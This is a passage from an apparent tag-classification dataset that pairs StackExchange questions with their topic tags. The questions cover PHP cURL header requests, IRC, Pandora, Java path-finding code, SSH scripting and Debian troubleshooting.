    "source": "How to get a github release filesize using CURL without downloading a file? <eos> For a project I need to fetch the file size of a GitHub release file using CURL without actually downloading the entire file. $url = 'https://github.com/atom/atom/releases/download/v1.10.2/AtomSetup.exe'$ch = curl_init($url);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HEADER, 1);curl_setopt($ch, CURLOPT_NOBODY, 1);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);$data = curl_exec($ch);$size = curl_getinfo($ch, CURLINFO_CONTENT_LENGTH_DOWNLOAD);curl_close($ch);echo $size;echo $data;As I have figured out CURLOPT_NOBODY allows me to just get the size of the file (from it's header) without actually downloading the entire file. If I remove line I do get the filesize but that also downloads the entire file, and that's something I'm trying to avoid. CURLOPT_NOBODY also replaces GET request with HEAD and I guess that's the part of the problem.I have also tried setting up CURLOPT_USERAGENT, CURLOPT_COOKIEFILE and CURLOPT_COOKIEJAR but that didn't work out.Any help is warm welcome!Here is the complete CURL output:HTTP/1.1 302 FoundServer: GitHub.comDate: Mon, 06 Feb 2017 16:19:08 GMTContent-Type: text/html; charset=utf-8Status: 302 FoundCache-Control: no-cacheVary: X-PJAXLocation: https://github-cloud.s3.amazonaws.com/releases/3228505/5b5e9204-7507-11e6-8019-f5a3bc356747.exe?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIA X-UA-Compatible: IE=Edge,chrome=1Set-Cookie: _gh_sess=eyJzZXNzaW9uX2lkIjoiNWFjZWNhZDEzMjFmMmFkNmFjOGMxOTIwNzRlNGQzNTEiLCJzcHlfcmVwbyI6ImF0b20vYXRvbSIsInNweV9yZXBvX2F0IjoxNDg2Mzk3OTQ4fQ%3D%3D--2 X-Request-Id: 4d192195dc74c4f6a056710d3fd30be9X-Runtime: 0.120950Content-Security-Policy: default-src 'none'; base-uri 'self'; connect-src 'self' uploads.github.com status.github.com collector.githubapp.com api.github.com www Strict-Transport-Security: max-age=31536000; includeSubdomains; preloadPublic-Key-Pins: max-age=5184000; pin-sha256=WoiWRyIOVNa9ihaBciRSC7XHjliYS9VwUGOIud4PB18=; pin-sha256=RRM1dGqnDFsCJXBTHky16vi1obOlCgFFn/yOhI/y+ho=; pin-sha2 X-Content-Type-Options: nosniffX-Frame-Options: denyX-XSS-Protection: 1; mode=blockVary: Accept-EncodingX-Served-By: 97b025644def4c59b05efb255b209cdaX-GitHub-Request-Id: CF4C:3E44:58EC2B1:8D98E31:5898A1FBHTTP/1.1 403 Forbiddenx-amz-request-id: 962EAB609235815Dx-amz-id-2: 1uccfAjq9MwgFo5BUGLhFkCjCNhkQKpVnAU9s6AF0pNy0fPqnEw6Se+UOa1RESRxyAmtoZXKImw=Content-Type: application/xmlTransfer-Encoding: chunkedDate: Mon, 06 Feb 2017 16:19:07 GMTServer: AmazonS3",
    "target": "php;github"
  },
  {
    "id": "_webapps.25364",
    "source": "Web IRC - how do I filter out the noise of people leaving and entering a room? <eos> I log in to http://webchat.freenode.net/ regularly. But in most channels, the amount of chatting is lesser than the notifications of users entering/leaving. Is there a command I can use that either hides this data or gives it a different color so I can ignore it?",
    "target": "irc"
  },
  {
    "id": "_webapps.59665",
    "source": "How can I exclude a particular genre of music from playlists on Pandora? <eos> I would like to know how can I take Gospel music out of my stations.  I use Pandora a lot while I workout and although I like Gospel, I don't want to hear it during my workout. I play Pandora at home sometimes when i have small gatherings and on one station it will go from My Goodies to We Fall Down, almost inappropriately. I know it can be done I'm just not sure how to do it. Can someone help me out? ",
    "target": "pandora;pandora playlist"
  },
  {
    "id": "_codereview.33017",
    "source": "Reusing Code With Database Cursors <eos> I find myself using this bit of code very often when I am retrieving the results from a CursorSearchItem searchItem = new SearchItem();searchItem.setId(cursor.getInt(cursor.getColumnIndex(COLUMN_NAME_ID)));searchItem.setOrigin(cursor.getString(cursor.getColumnIndex(COLUMN_NAME_ORIGIN)));searchItem.setDestination(cursor.getString(cursor.getColumnIndex(COLUMN_NAME_DESTINATION)));searchItem.setTimeStamp(cursor.getLong(cursor.getColumnIndex(COLUMN_NAME_TIMESTAMP)));Specifically this could be when I am using a CursorAdapter for a ListView and in a DAO object.What would be a useful design pattern to use in this case?My first instinct is to have a singleton class which does this. Are there any problems in taking this route?",
    "target": "java;android"
  },
  {
    "id": "_unix.311795",
    "source": "I want to use the variable declared inside an SSH session to be used locally in my shell script <eos> Whenever I try to use the variable declared inside my SSH session it gives me blank output. Here is the code which I am trying to execute:ssh -T host <<\\HEREexport usage1=$(df -h |grep /nas/infa|sed s/%//g| awk '{printf(%d\\n,$4)}');echo $usage1HEREecho $usage1I am able to get the desired output inside the SSH session, but when calling the same variable outside the SSH it gives me blank.",
    "target": "shell script;ssh;scripting;variable"
  },
  {
    "id": "_softwareengineering.135240",
    "source": "Best approach to selecting programming languages and 3D graphics API for simulating physics experiments <eos> I am starting a research project and need to nail down a programming language and 3D graphics API where I will be creating an environment in the field of molecular cell biology where I will be simulating a large range of experiments in silico. This will be an ongoing project which will keep expanding and growing in size. The experiments will be done in discrete time and will encompass a complex physics engine. Pretty graphics are not of importance nor is is audio. I run Ubuntu and this is the environment I will be developing in.The pairs I have investigated thus far are:java : flexible,scalable,lib/dependency organization (maven),oojogl: full control of graphicsjMonkeyEngine: full game library, includes jBullet, maybe a bit overkill for what I need.c++ : High speed, low level, ooopengl:full control of graphicsmaya:built in physics engine, infrastructure already in place, proprietary, not free matlab : Heavily math based, but difficult to maintain and scalesimulink : proprietary, not freeI am least familiar with Maya but it was suggested to me by a friend as a good approach. When would Maya be a good solution and would it be a good selection for this type of case? Just as thinking jMonkey would be overkill this is kinda my feeling on Maya.Are there any other pairings I should investigate? Also has anyone had any experience modifying an existing physics library and the flexibility or complexity of doing so (ie Bullet, JBullet, jinngine)? Unsure at this point if I should start from scratch or try and modify/expand an existing one. Any thoughts, feedback, input or any other suggestions would be greatly appreciated.Thanks",
    "target": "java;c++;3d;opengl;simulation"
  },
  {
    "id": "_softwareengineering.129123",
    "source": "Were the first assemblers written in machine code? <eos> I am reading the book The Elements of Computing Systems: Building a Modern Computer from First Principles, which contains projects encompassing the build of a computer from boolean gates all the way to high level applications (in that order).  The current project I'm working on is writing an assembler using a high level language of my choice, to translate from Hack assembly code to Hack machine code (Hack is the name of the hardware platform built in the previous chapters).  Although the hardware has all been built in a simulator, I have tried to pretend that I am really constructing each level using only the tools available to me at that point in the real process.That said, it got me thinking.  Using a high level language to write my assembler is certainly convenient, but for the very first assembler ever written (i.e. in history), wouldn't it need to be written in machine code, since that's all that existed at the time?And a correlated question... how about today?  If a brand new CPU architecture comes out, with a brand new instruction set, and a brand new assembly syntax, how would the assembler be constructed?  I'm assuming you could still use an existing high level language to generate binaries for the assembler program, since if you know the syntax of both the assembly and machine languages for your new platform, then the task of writing the assembler is really just a text analysis task and is not inherently related to that platform (i.e. needing to be written in that platform's machine language)... which is the very reason I am able to cheat while writing my Hack assembler in 2012, and use some preexisting high level language to help me out.",
    "target": "assembly;low level"
  },
  {
    "id": "_unix.113893",
    "source": "How do I find out which process is using my V4L2 webcam? <eos> I tried to run the following:$ vlc -I dummy v4l2:///dev/video0 --video-filter scene --no-audio --scene-path webcam.png --scene-prefix image_prefix --scene-format png vlc://quit --run-time=1                                                     VLC media player 2.0.7 Twoflower (revision 2.0.6-54-g7dd7e4d)                                                                                                                                                                                                             [0x1f4a1c8] dummy interface: using the dummy interface module...                                                                                                                                                                                                          [0x7fc19c001238] v4l2 demux error: VIDIOC_STREAMON failed                                                                                                                                                                                                                 libv4l2: error setting pixformat: Device or resource busy                                                                                                                                                                                                                 libv4l2: error setting pixformat: Device or resource busy                                                                                                                                                                                                                 libv4l2: error setting pixformat: Device or resource busy                                                                                                                                                                                                                 libv4l2: error setting pixformat: Device or resource busy                                                                                                                                                                                                                 libv4l2: error setting pixformat: Device or resource busy                                                                                                                                                                                                                 libv4l2: error setting pixformat: Device or resource busy                                                                                                                                                                                                                 libv4l2: error setting pixformat: Device or resource busy                                                                                                                                                                                                                 libv4l2: error setting pixformat: Device or resource busy                                                                                                                                                                                                                 libv4l2: error setting pixformat: Device or resource busy                                                                                                                                                                                                                 libv4l2: error setting pixformat: Device or resource busy                                                                                                                                                                                                                 [0x7fc19c007f18] v4l2 access error: cannot set input 0: Device or resource busy                                                                                                                                                                                           [0x7fc19c007f18] v4l2 access error: cannot set input 0: Device or resource busy                                                                                                                                                                                           [0x7fc1a4000b28] main input error: open of `v4l2:///dev/video0' failed                                                                                                                                                                                                    [0x7fc1a4000b28] main input error: Your input can't be opened                                                                                                                                                                                                             [0x7fc1a4000b28] main input error: VLC is unable to open the MRL 'v4l2:///dev/video0'. Check the log for details.                                                                                                                                                         [0x7fc19c007cc8] idummy demux: command `quit'    So I'm assuming that there is a program currently accessing my webcam, which is cumbersome since its light is off and lsof | grep /dev/video returns nothing. Is there another, proper way to check what processes are currently using my webcam? Or is the problem of an entirely different nature?",
    "target": "devices;camera;vlc;v4l"
  },
  {
    "id": "_codereview.77241",
    "source": "Small generic path search framework in Java <eos> I have this small generic path search library. It's not perfect at all, so I need some comments as to have a chance to improve it.com.stackexchange.codereview.graph.model:AbstractHeuristicFunction.java:package com.stackexchange.codereview.graph.model;public interface AbstractHeuristicFunction<T extends AbstractNode<T>> {    public void setTarget(final T target);    public void setLayout(final PlaneLayout layout);    public double h(final T node);}AbstractNode.java:package com.stackexchange.codereview.graph.model;public abstract class AbstractNode<T extends AbstractNode<T>> implements Iterable<T> {    protected final String id;    protected AbstractNode(final String id) {        if (id == null) {            throw new IllegalArgumentException(The ID string is null.);        }        this.id = id;    }    public abstract boolean connectTo(final T node);    public abstract boolean disconnectFrom(final T node);    public abstract boolean isConnectedTo(final T node);    public abstract Iterable<T> parents();    @Override    public int hashCode() {        return id.hashCode();    }    @Override    public boolean equals(final Object o) {        if (!(o instanceof AbstractNode)) {            return false;        }        return (((AbstractNode<T>) o).id.equals(this.id));    }}AbstractWeightFunction.java:package com.stackexchange.codereview.graph.model;import java.util.HashMap;import java.util.Map;public abstract class AbstractWeightFunction<T extends AbstractNode<T>> {    protected final Map<T, Map<T, Double>> map;    protected AbstractWeightFunction() {        this.map = new HashMap<>();    }    public abstract Double put(final T node1,                                final T node2,                                final double weight);    public abstract double get(final T node1, final T node2);}AbstractPathFinder.java:package com.stackexchange.codereview.graph.model;import java.util.ArrayList;import java.util.Collections;import java.util.List;import java.util.Map;public abstract class AbstractPathFinder<T extends AbstractNode<T>> {    public abstract List<T> search(final T source, final T target);    protected List<T> constructPath(final T middleNode,                                     final Map<T, T> parentMapA,                                    final Map<T, T> parentMapB) {        final List<T> path = new ArrayList<>();        T current = middleNode;        while (current != null) {            path.add(current);            current = parentMapA.get(current);        }        Collections.<T>reverse(path);        if (parentMapB != null) {            current = parentMapB.get(middleNode);            while (current != null) {                path.add(current);                current = parentMapB.get(current);            }        }        return path;    }    protected List<T> constructPath(final T target, final Map<T, T> parentMap) {        return constructPath(target, parentMap, null);    }}PlaneLayout.java:package com.stackexchange.codereview.graph.model;import java.awt.geom.Point2D;import java.util.HashMap;import java.util.Map;public class PlaneLayout<T extends AbstractNode<T>> {    private final Map<T, Point2D.Double> map;    public PlaneLayout() {        this.map = new HashMap<>();    }    public Point2D.Double put(final T node, final Point2D.Double location) {        return map.put(node, location);    }    public Point2D.Double get(final T node) {        return map.get(node);    }}com.stackexchange.codereview.graph.model.support:AStarPathFinder.java:package com.stackexchange.codereview.graph.model.support;import static com.stackexchange.codereview.graph.Utils.checkNotNull;import com.stackexchange.codereview.graph.model.AbstractHeuristicFunction;import com.stackexchange.codereview.graph.model.AbstractNode;import com.stackexchange.codereview.graph.model.AbstractWeightFunction;import com.stackexchange.codereview.graph.model.AbstractPathFinder;import java.util.Collections;import java.util.Comparator;import java.util.HashMap;import java.util.HashSet;import java.util.List;import java.util.Map;import java.util.PriorityQueue;import java.util.Set;public class AStarPathFinder<T extends AbstractNode<T>>extends AbstractPathFinder<T> {    private AbstractHeuristicFunction<T> heuristicFunction;    private AbstractWeightFunction<T> weightFunction;    private final Map<T, T> PARENTS;    private final Map<T, Double> DISTANCE;    private final Set<T> CLOSED;    private PriorityQueue<T> OPEN;    public AStarPathFinder() {        this.PARENTS = new HashMap<>();        this.DISTANCE = new HashMap<>();        this.CLOSED = new HashSet<>();    }    @Override    public List<T> search(T source, T target) {        checkNotNull(heuristicFunction, Heuristic function is null.);        checkNotNull(weightFunction, Weight function is null.);        clearState();        heuristicFunction.setTarget(target);        OPEN.add(source);        PARENTS.put(source, null);        DISTANCE.put(source, 0.0);        while (OPEN.size() > 0) {            final T current = OPEN.poll();            if (current.equals(target)) {                return constructPath(target, PARENTS);            }            CLOSED.add(current);            for (final T child : current) {                if (CLOSED.contains(child)) {                    continue;                }                final double w = g(current) + w(current, child);                if (!PARENTS.containsKey(child)) {                    PARENTS.put(child, current);                    DISTANCE.put(child, w);                    // DISTANCE updated, implicitly used by OPEN.add.                    OPEN.add(child);                } else if (w < g(child)) {                    PARENTS.put(child, current);                    DISTANCE.put(child, w);                    // Reinsert as to decrease the priority.                    OPEN.remove(child);                    OPEN.add(child);                }            }        }        // Empty list denotes that target is not reachable from source.        return Collections.<T>emptyList();    }    public AStarPathFinder<T>          setWeightFunction(final AbstractWeightFunction<T> function) {        this.weightFunction = function;        return this;    }    public AStarPathFinder<T>        setHeuristicFunction(final AbstractHeuristicFunction<T> function) {        this.heuristicFunction = function;        this.OPEN = new PriorityQueue<>(                new FValueComparator(DISTANCE, function));        return this;    }    private double h(final T node) {        return heuristicFunction.h(node);    }    private double w(final T tail, final T head) {        return weightFunction.get(tail, head);    }    private double g(final T node) {        return DISTANCE.get(node);    }    private void clearState() {        PARENTS.clear();        DISTANCE.clear();        CLOSED.clear();        OPEN.clear();    }    private class FValueComparator implements Comparator<T> {        private final Map<T, Double> DISTANCE;        private final AbstractHeuristicFunction<T> function;        FValueComparator(final Map<T, Double> DISTANCE,                         final AbstractHeuristicFunction<T> function) {            this.DISTANCE = DISTANCE;            this.function = function;        }        @Override        public int compare(final T o1, final T o2) {            final double f1 = DISTANCE.get(o1) + function.h(o1);            final double f2 = DISTANCE.get(o2) + function.h(o2);            return Double.compare(f1, f2);        }    }}DijkstraHeuristicFunction.java:package com.stackexchange.codereview.graph.model.support;import com.stackexchange.codereview.graph.model.AbstractHeuristicFunction;import com.stackexchange.codereview.graph.model.AbstractNode;import com.stackexchange.codereview.graph.model.PlaneLayout;public class DijkstraHeuristicFunction<T extends AbstractNode<T>> implements AbstractHeuristicFunction<T> {    @Override    public double h(T node) {        return 0.0;    }    @Override    public void setTarget(T target) {    }    @Override    public void setLayout(PlaneLayout layout) {    }}DirectedGraphNode.java:package com.stackexchange.codereview.graph.model.support;import com.stackexchange.codereview.graph.model.AbstractNode;import java.util.Iterator;import java.util.LinkedHashSet;import java.util.Set;public class DirectedGraphNode extends AbstractNode<DirectedGraphNode> {    private final Set<DirectedGraphNode> in;    private final Set<DirectedGraphNode> out;    public DirectedGraphNode(final String id) {        super(id);        // LinkedHashSet iterates way faster than HashSet.        this.in  = new LinkedHashSet<>();        this.out = new LinkedHashSet<>();    }    @Override    public boolean connectTo(DirectedGraphNode node) {        if (out.contains(node)) {            return false;        }        out.add(node);        node.in.add(this);        return true;    }    @Override    public boolean disconnectFrom(DirectedGraphNode node) {        if (!out.contains(node)) {            return false;        }        out.remove(node);        node.in.remove(this);        return true;    }    @Override    public boolean isConnectedTo(DirectedGraphNode node) {        return out.contains(node);    }    @Override    public Iterable<DirectedGraphNode> parents() {        return new Iterable<DirectedGraphNode>() {            @Override            public Iterator<DirectedGraphNode> iterator() {                return new IteratorProxy<>(in.iterator());            }        };    }    @Override    public Iterator<DirectedGraphNode> iterator() {        return new IteratorProxy<>(out.iterator());    }    @Override    public String toString() {        return [DirectedGraphNode  + id + ];    }}DirectedGraphWeightFunction.java:package com.stackexchange.codereview.graph.model.support;import com.stackexchange.codereview.graph.model.AbstractWeightFunction;import java.util.HashMap;public class DirectedGraphWeightFunction extends AbstractWeightFunction<DirectedGraphNode> {    public DirectedGraphWeightFunction() {        super();    }    @Override    public Double put(final DirectedGraphNode node1,                       final DirectedGraphNode node2,                       final double weight) {        if (!map.containsKey(node1)) {            map.put(node1, new HashMap<>());        }        final Double old = map.get(node1).get(node2);        map.get(node1).put(node2, weight);        return old;    }    @Override    public double get(final DirectedGraphNode node1,                       final DirectedGraphNode node2) {        return map.get(node1).get(node2);    }}IteratorProxy.java:package com.stackexchange.codereview.graph.model.support;import java.util.Iterator;public class IteratorProxy<T> implements Iterator<T> {    private final Iterator<T> iterator;    protected IteratorProxy(final Iterator<T> iterator) {        this.iterator = iterator;    }    @Override    public boolean hasNext() {        return iterator.hasNext();    }    @Override    public T next() {        return iterator.next();    }}PlaneHeuristicFunction.java:package com.stackexchange.codereview.graph.model.support;import com.stackexchange.codereview.graph.model.AbstractHeuristicFunction;import com.stackexchange.codereview.graph.model.AbstractNode;import com.stackexchange.codereview.graph.model.PlaneLayout;import java.awt.geom.Point2D;public class PlaneHeuristicFunction<T extends AbstractNode<T>> implements AbstractHeuristicFunction<T> {    private T target;    private PlaneLayout<T> layout;    private Point2D.Double targetLocation;    public PlaneHeuristicFunction(final PlaneLayout<T> layout,                                  final T target) {        this.layout = layout;        this.targetLocation = layout.get(target);    }    @Override    public void setLayout(PlaneLayout layout) {        this.layout = layout;        this.targetLocation = layout.get(target);    }    @Override    public void setTarget(T target) {        this.target = target;        this.targetLocation = layout.get(target);    }    @Override    public double h(final T node) {        return targetLocation.distance(layout.get(node));    }}com.stackexchange.codereview.graph:Utils.java:package com.stackexchange.codereview.graph;import com.stackexchange.codereview.graph.model.PlaneLayout;import com.stackexchange.codereview.graph.model.support.DirectedGraphNode;import com.stackexchange.codereview.graph.model.support.DirectedGraphWeightFunction;import java.awt.geom.Point2D;import java.util.ArrayList;import java.util.List;import java.util.Random;public class Utils {    public static class Triple<F, S, T> {        private final F first;        private final S second;        private final T third;        public Triple(final F first, final S second, final T third) {            this.first = first;            this.second = second;            this.third = third;        }        public F first() {            return first;        }        public S second() {            return second;        }        public T third() {            return third;        }    }    public static Triple<List<DirectedGraphNode>,                         DirectedGraphWeightFunction,                         PlaneLayout>        createRandomDigraph(final int nodeAmount,                            float edgeLoadFactor,                            final double width,                            final double height,                            final double maxDistance,                            double weightFactor,                            final Random rnd) {        final List<DirectedGraphNode> graph = new ArrayList<>(nodeAmount);        final PlaneLayout layout = new PlaneLayout();        final DirectedGraphWeightFunction weightFunction =                new DirectedGraphWeightFunction();        for (int i = 0; i < nodeAmount; ++i) {            final DirectedGraphNode node = new DirectedGraphNode( + i);            layout.put(node, new Point2D.Double(width * rnd.nextDouble(),                                                height * rnd.nextDouble()));            graph.add(node);        }        weightFactor = Math.max(weightFactor, 1.05);        edgeLoadFactor = Math.min(edgeLoadFactor, 0.8f);        int edges = (int)(edgeLoadFactor * nodeAmount * nodeAmount);        while (edges > 0) {            final DirectedGraphNode tail = choose(graph, rnd);            final DirectedGraphNode head = choose(graph, rnd);            final Point2D.Double tailPoint = layout.get(tail);            final Point2D.Double headPoint = layout.get(head);            final double distance = tailPoint.distance(headPoint);            if (distance <= maxDistance) {                tail.connectTo(head);                weightFunction.put(tail, head, weightFactor * distance);                --edges;            }        }        return new Triple<>(graph, weightFunction, layout);    }    public static <E> E choose(final List<E> list, final Random rnd) {        if (list.isEmpty()) {            return null;        }        return list.get(rnd.nextInt(list.size()));    }    public static void checkNotNull(final Object reference,                                     final String message) {        if (reference == null) {            throw new NullPointerException(message);        }    }    public static <E> boolean listsAreSame(final List<E> list1,                                            final List<E> list2) {        if (list1.size() != list2.size()) {            return false;        }        for (int i = 0; i < list1.size(); ++i) {            if (!list1.get(i).equals(list2.get(i))) {                return false;            }        }        return true;    }}Demo.java:package com.stackexchange.codereview.graph;import com.stackexchange.codereview.graph.Utils.Triple;import static com.stackexchange.codereview.graph.Utils.choose;import static com.stackexchange.codereview.graph.Utils.listsAreSame;import com.stackexchange.codereview.graph.model.PlaneLayout;import com.stackexchange.codereview.graph.model.support.AStarPathFinder;import com.stackexchange.codereview.graph.model.support.DijkstraHeuristicFunction;import com.stackexchange.codereview.graph.model.support.DirectedGraphNode;import com.stackexchange.codereview.graph.model.support.DirectedGraphWeightFunction;import com.stackexchange.codereview.graph.model.support.PlaneHeuristicFunction;import java.util.List;import java.util.Random;public class Demo {    public static final int GRAPH_SIZE = 100000;    public static final float EDGE_LOAD_FACTOR = 4.0f / GRAPH_SIZE;    public static final double WIDTH = 2000.0;    public static final double HEIGHT = 1000.0;    public static final double MAX_DISTANCE = 100.0;    public static final double WEIGHT_FACTOR = 1.1;    public static void main(final String... args) {        final long seed = System.currentTimeMillis();        System.out.println(Seed:  + seed);        final Random rnd = new Random(seed);        Triple<List<DirectedGraphNode>,               DirectedGraphWeightFunction,                PlaneLayout> data =                 Utils.createRandomDigraph(GRAPH_SIZE,                                          EDGE_LOAD_FACTOR,                                           WIDTH,                                          HEIGHT,                                           MAX_DISTANCE,                                          WEIGHT_FACTOR,                                          rnd);        final DirectedGraphNode source = choose(data.first(), rnd);        final DirectedGraphNode target = choose(data.first(), rnd);        System.out.println(Source:  + source);        System.out.println(Target:  + target);        final AStarPathFinder<DirectedGraphNode> finder =                new AStarPathFinder<>()                .setHeuristicFunction(                        new PlaneHeuristicFunction<>(data.third(), target))                .setWeightFunction(data.second());        long ta = System.currentTimeMillis();        final List<DirectedGraphNode> path1 = finder.search(source, target);        long tb = System.currentTimeMillis();        System.out.println(A* in  + (tb - ta) +  ms.);        for (final DirectedGraphNode node : path1) {            System.out.println(node);        }        System.out.println();        finder.setHeuristicFunction(new DijkstraHeuristicFunction<>());        ta = System.currentTimeMillis();        final List<DirectedGraphNode> path2 = finder.search(source, target);        tb = System.currentTimeMillis();        System.out.println(Dijkstra's algorithm in  + (tb - ta) +  ms.);        for (final DirectedGraphNode node : path2) {            System.out.println(node);        }        System.out.println();        System.out.println(Paths are same:  + listsAreSame(path1, path2));    }}",
    "target": "java;search;graph;pathfinding;framework"
  },
  {
    "id": "_cs.59565",
    "source": "Would removing the branch delay slots change the instructions set architecture? <eos> I am trying to study for an exam and I noticed a lot of the questions follow the idea of  Changing the ISA. From my understanding the ISA dictates the structure and format of instructions, so changing instructions or the format (32 to 64 bit) would change the ISA. However I ran into a question which I am not sure how to answer.If we remove the branch delay slots, will the ISA be changed?My guess would be no, because we're not changing any instructions (right?), but I would like to get an answer from someone more knowledgeable.",
    "target": "computer architecture;cpu"
  },
  {
    "id": "_cstheory.11182",
    "source": "Is a turing machine with random number generator more powerful? <eos> Let's extend the Turing machine so that it can read from a stream of random number generators (in addition to an infinite tape to read and write). Certainly the TM with randomness can do whatever a classical TM do, but what about the converse?One can argue that the classical TM will always generate the same result given the same input,  while the TM with randomness can behave randomly, it can do more. But, then random-valued functions are not really what we call computable. I am aware of randomized algorithms and BPP and what not, but is there an extension of computability that deals with these kind of questions?",
    "target": "computability;turing machines;randomness"
  },
  {
    "id": "_softwareengineering.155697",
    "source": "Is the structure used for these web pages a design pattern? <eos> I want to know if the structure for an ASP.NET website I'm working on uses a design pattern for it's web pages. If it is a design pattern, what is it called? The web pages have the following structure:UserDetails page (UserDetails.aspx) - includes UserDetailsController.ascx user control. UserDetailsController.ascx includes sub user controls like UserAccountDetails.ascx and UserLoginDetails.ascx etcEach sub user control contains a small amount of code/logic, the 'controller' user controls that host these sub user controls (i.e UserDetailsController.ascx) appear to call the business rules code and pass the data to the sub user controls.Is this a design pattern? What is it called?",
    "target": "c#;design patterns;asp.net"
  },
  {
    "id": "_softwareengineering.278144",
    "source": "equal distribution within given set of users <eos> I have a requirement where I have a list of entity and users who that entity can be assignedE1 can be distributed by U1 or U2 E2 must be distributed by U5 E3 can be distributed by U2 or U3 or U4I have such 50K entities and for each entity there might be 1 or more users. In case of 1 user, its clear and entity will be assigned to that user only. In case of multiple users, it can be assigned to any one them.  We want to distribute it such that each user gets equal amount of entities. and there are minimal possible/unavoidable skewed distributions, also each user might already posses some entities : U1 has 2K and U2 has 3K entitis already, so the distribution should take care of this fact as well.EDIT 1We have already tried a solution of going sequentially and assigning one entity at a time as per the allocation to users at that point in time, but that producing skewed results, because we are getting users who have less allocation earlier but more allocation later or viceversa...E1 to E25 must be handled by any of U1 & U2 E26 to E50 must be handled by any of U2 & U3 if we go sequentially, in the end : U1 gets 12 (from E1-E25), U2 gets 19 (13 from E1-E25 & 6 from E26-E50) & U3 gets 19(from E26-E50). So all in all 50 allocated. fine. but see the skewed resultsEDIT2Why do we have different users per entity? there are multiple products to be distributed. Some users handle multiple products and some users handle single product, but still all the users need to be load balanced.",
    "target": "algorithms;distribution"
  },
  {
    "id": "_unix.349098",
    "source": "Ubuntu software-center : Unable to correct problems, you have held broken packages <eos> Package software-center not found on Ubuntu 14.04 LTS.I tried to Install it via terminal, But ended up with below error :ravip@LP204:~$ sudo apt-get install software-center[sudo] password for ravip: Reading package lists... DoneBuilding dependency tree       Reading state information... DoneSome packages could not be installed. This may mean that you haverequested an impossible situation or if you are using the unstabledistribution that some required packages have not yet been createdor been moved out of Incoming.The following information may help to resolve the situation:The following packages have unmet dependencies: software-center : Depends: software-center-aptdaemon-plugins but it is not going to be installed                   Depends: python-gi but it is not going to be installed                   Depends: python-gi-cairo but it is not going to be installed                   Depends: python-aptdaemon (>= 0.40) but it is not going to be installed                   Depends: python-aptdaemon.gtk3widgets but it is not going to be installed                   Depends: oneconf (>= 0.2.6) but it is not going to be installed                   Recommends: software-properties-gtk but it is not going to be installed                   Recommends: sessioninstaller but it is not going to be installedE: Unable to correct problems, you have held broken packages.All Depends & Recommends Packages are already installed & at newest version.How can I resolve ?",
    "target": "ubuntu;apt;software installation;software updates"
  },
  {
    "id": "_unix.283700",
    "source": "Nothing survives reboot in Debian Jessie <eos> Running RasPBX based on Debian Jessie - I tried to change a few .conf files, but they always reverted following reboot. I initially thought this was dhcp messing with things, but it turns out nothing survives reboot. Even a .txt file I created in the home directory gets deleted.tl;dr - SSH in, change stuff, reboot, all changes reverted.Output of mount:/dev/mmcblk0p2 on / type ext4 (rw,noatime,data=ordered)devtmpfs on /dev type devtmpfs (rw,relatime,size=469688k,nr_inodes=117422,mode=755)sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)proc on /proc type proc (rw,relatime)tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)tmpfs on /run type tmpfs (rw,nosuid,nodev,mode=755)tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,release_agent=/lib/systemd/systemd-cgroups-agent,name=systemd)cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)cgroup on /sys/fs/cgroup/net_cls type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls)systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=22,pgrp=1,timeout=300,minproto=5,maxproto=5,direct)debugfs on /sys/kernel/debug type debugfs (rw,relatime)mqueue on /dev/mqueue type mqueue (rw,relatime)configfs on /sys/kernel/config type configfs (rw,relatime)/dev/mmcblk0p1 on /boot type vfat (rw,relatime,fmask=0022,dmask=0022,codepage=437,iocharset=ascii,shortname=mixed,errors=remount-ro)Output of dmesg | grep -E 'mmc|ext' :)[    0.000000] Kernel command line: 8250.nr_uarts=1 dma.dmachans=0x7f35 bcm2708_fb.fbwidth=656 bcm2708_fb.fbheight=416 bcm2709.boardrev=0xa02082 bcm2709.serial=0xb59dde09 smsc95xx.macaddr=B8:27:EB:9D:DE:09 bcm2708_fb.fbswap=1 bcm2709.uart_clock=48000000 vc_mem.mem_base=0x3dc00000 vc_mem.mem_size=0x3f000000  dwc_otg.lpm_enable=0 console=ttyS0,115200 console=tty1 root=/dev/mmcblk0p2 rootfstype=ext4 elevator=deadline fsck.repair=yes rootwait      .text : 0x80008000 - 0x807945f0   (7730 kB)[    0.052137] CPU: Virtualization extensions available.[    2.418638] mmc0: sdhost-bcm2835 loaded - DMA enabled (>1)[    2.451228] mmc-bcm2835 3f300000.mmc: mmc_debug:0 mmc_debug2:0[    2.462049] mmc-bcm2835 3f300000.mmc: DMA channel allocated[    2.489744] mmc0: host does not support reading read-only switch, assuming write-enable[    2.508346] mmc0: new high speed SDHC card at address 59b4[    2.654165] Waiting for root device /dev/mmcblk0p2...[    2.654367] mmcblk0: mmc0:59b4 00000 7.35 GiB[    2.655651]  mmcblk0: p1 p2[    2.674572] mmc1: queuing unknown CIS tuple 0x80 (2 bytes)[    2.676113] mmc1: queuing unknown CIS tuple 0x80 (3 bytes)[    2.677657] mmc1: queuing unknown CIS tuple 0x80 (3 bytes)[    2.680430] mmc1: queuing unknown CIS tuple 0x80 (7 bytes)[    2.742278] EXT4-fs (mmcblk0p2): INFO: recovery required on readonly filesystem[    2.755364] EXT4-fs (mmcblk0p2): write access will be enabled during recovery[    